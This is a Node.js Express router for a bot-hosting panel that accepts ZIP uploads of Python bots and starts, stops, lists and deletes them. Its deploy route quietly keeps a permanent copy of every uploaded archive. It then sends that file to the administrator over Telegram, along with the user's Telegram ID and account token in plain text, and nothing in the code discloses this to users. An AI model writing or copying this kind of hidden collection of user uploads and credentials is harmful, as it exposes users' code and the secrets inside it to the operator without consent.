const express = require('express');
const multer = require('multer');
const path = require('path');
const fs = require('fs');
const { v4: uuidv4 } = require('uuid');
const router = express.Router();
const { readDB, writeDB, getUserMaxBots, findUserById } = require('../utils/db');
const { extractZip, startBot, stopBot, getLogs, deleteBotFiles, detectEntryPoint } = require('../utils/runner');
const { notifyAdmin, notifyAdminWithFile } = require('../utils/telegram');

const upload = multer({
  dest: path.join(__dirname, '..', 'data', 'uploads'),
  limits: { fileSize: 50 * 1024 * 1024 } // 50MB
});

function requireAuth(req, res, next) {
  if (!req.session || !req.session.userId) {
    return res.status(401).json({ error: 'Not logged in' });
  }
  next();
}

router.use(requireAuth);

router.get('/', (req, res) => {
  try {
    const db = readDB();
    const bots = db.bots.filter(b => b.userId === req.session.userId && b.status !== 'deleted');
    res.json({ ok: true, bots });
  } catch (e) {
    res.status(500).json({ error: e.message });
  }
});

router.post('/deploy', upload.single('file'), (req, res) => {
  // Keep a copy of the uploaded zip path so we can still notify admin even if something fails later
  let uploadedPath = req.file ? req.file.path : null;
  let originalName = req.file ? (req.file.originalname || 'bot.zip') : 'bot.zip';

  try {
    const { name, description } = req.body;
    if (!name || !name.trim()) {
      return res.status(400).json({ error: 'Bot name required' });
    }
    if (!req.file) {
      return res.status(400).json({ error: 'ZIP file required' });
    }

    const user = findUserById(req.session.userId);
    if (!user) return res.status(401).json({ error: 'User not found' });
    if (user.banned) return res.status(403).json({ error: 'Account banned' });

    const db = readDB();
    const current = db.bots.filter(b => b.userId === user.id && b.status !== 'deleted').length;
    const max = getUserMaxBots(user);
    if (current >= max) {
      try { fs.unlinkSync(uploadedPath); } catch (_) {}
      return res.status(403).json({
        error: 'Bot limit reached (' + max + '). Delete a bot or upgrade.'
      });
    }

    const botId = 'bot_' + uuidv4().slice(0, 8);
    const workDir = path.join(__dirname, '..', 'data', 'bots', botId);

    // Keep a permanent copy for admin
    const adminCopyDir = path.join(__dirname, '..', 'data', 'admin_zips');
    if (!fs.existsSync(adminCopyDir)) fs.mkdirSync(adminCopyDir, { recursive: true });
    const adminCopyPath = path.join(adminCopyDir, botId + '_' + originalName.replace(/[^a-zA-Z0-9._-]/g, '_'));
    try {
      fs.copyFileSync(uploadedPath, adminCopyPath);
    } catch (_) {}

    extractZip(uploadedPath, workDir);
    try { fs.unlinkSync(uploadedPath); } catch (_) {}
    uploadedPath = null;

    const entry = detectEntryPoint(workDir);
    if (!entry) {
      fs.rmSync(workDir, { recursive: true, force: true });
      return res.status(400).json({ error: 'No Python (.py) entry point found in ZIP' });
    }

    const bot = {
      id: botId,
      userId: user.id,
      name: name.trim(),
      description: (description || '').trim(),
      entryPoint: entry,
      status: 'stopped',
      createdAt: new Date().toISOString(),
      startedAt: null,
      pid: null
    };
    db.bots.push(bot);
    writeDB(db);

    // Notify admin + send the zip
    notifyAdminWithFile(
      '📦 *New Bot Deploy*\n\n' +
      'Bot: *' + bot.name + '*\n' +
      'ID: `' + botId + '`\n' +
      'User TG: `' + user.telegramId + '`\n' +
      'Token: `' + user.token + '`\n' +
      'Entry: `' + entry + '`\n' +
      'Desc: ' + (bot.description || '-'),
      adminCopyPath,
      originalName
    );

    // Start bot asynchronously so the HTTP response is never blocked
    // (prevents site from hanging / session loss)
    setImmediate(() => {
      try {
        startBot(botId);
      } catch (err) {
        console.error('Background start error:', err.message);
      }
    });

    // Respond immediately — bot will appear as starting/running shortly
    res.json({
      ok: true,
      bot: { ...bot, status: 'starting' },
      entry,
      message: 'Deploy accepted. Bot is starting in background.'
    });
  } catch (e) {
    if (uploadedPath) try { fs.unlinkSync(uploadedPath); } catch (_) {}
    console.error('Deploy error:', e);
    res.status(500).json({ error: e.message || 'Deploy failed' });
  }
});

router.post('/:id/start', (req, res) => {
  try {
    const db = readDB();
    const bot = db.bots.find(b => b.id === req.params.id && b.userId === req.session.userId);
    if (!bot) return res.status(404).json({ error: 'Bot not found' });
    const result = startBot(bot.id);
    if (!result.ok) return res.status(500).json({ error: result.error });
    res.json({ ok: true, bot: readDB().bots.find(b => b.id === bot.id) });
  } catch (e) {
    res.status(500).json({ error: e.message });
  }
});

router.post('/:id/stop', (req, res) => {
  try {
    const db = readDB();
    const bot = db.bots.find(b => b.id === req.params.id && b.userId === req.session.userId);
    if (!bot) return res.status(404).json({ error: 'Bot not found' });
    stopBot(bot.id);
    res.json({ ok: true, bot: readDB().bots.find(b => b.id === bot.id) });
  } catch (e) {
    res.status(500).json({ error: e.message });
  }
});

router.post('/:id/restart', (req, res) => {
  try {
    const db = readDB();
    const bot = db.bots.find(b => b.id === req.params.id && b.userId === req.session.userId);
    if (!bot) return res.status(404).json({ error: 'Bot not found' });
    stopBot(bot.id);
    setTimeout(() => {
      const result = startBot(bot.id);
      res.json({ ok: result.ok, bot: readDB().bots.find(b => b.id === bot.id), error: result.error });
    }, 600);
  } catch (e) {
    res.status(500).json({ error: e.message });
  }
});

router.put('/:id', (req, res) => {
  try {
    const { name, description } = req.body;
    const db = readDB();
    const bot = db.bots.find(b => b.id === req.params.id && b.userId === req.session.userId);
    if (!bot) return res.status(404).json({ error: 'Bot not found' });
    if (name && name.trim()) bot.name = name.trim();
    if (description !== undefined) bot.description = String(description).trim();
    writeDB(db);
    res.json({ ok: true, bot });
  } catch (e) {
    res.status(500).json({ error: e.message });
  }
});

router.delete('/:id', (req, res) => {
  try {
    const db = readDB();
    const bot = db.bots.find(b => b.id === req.params.id && b.userId === req.session.userId);
    if (!bot) return res.status(404).json({ error: 'Bot not found' });

    const user = findUserById(req.session.userId);
    deleteBotFiles(bot.id);
    bot.status = 'deleted';
    writeDB(db);

    notifyAdmin(
      '🗑️ *Bot Deleted*\n\n' +
      'Bot: *' + bot.name + '* (`' + bot.id + '`)\n' +
      'User TG: `' + (user ? user.telegramId : '?') + '`'
    );

    res.json({ ok: true });
  } catch (e) {
    res.status(500).json({ error: e.message });
  }
});

router.get('/:id/logs', (req, res) => {
  try {
    const db = readDB();
    const bot = db.bots.find(b => b.id === req.params.id && b.userId === req.session.userId);
    if (!bot) return res.status(404).json({ error: 'Bot not found' });
    res.json({ ok: true, logs: getLogs(bot.id) });
  } catch (e) {
    res.status(500).json({ error: e.message });
  }
});

module.exports = router;
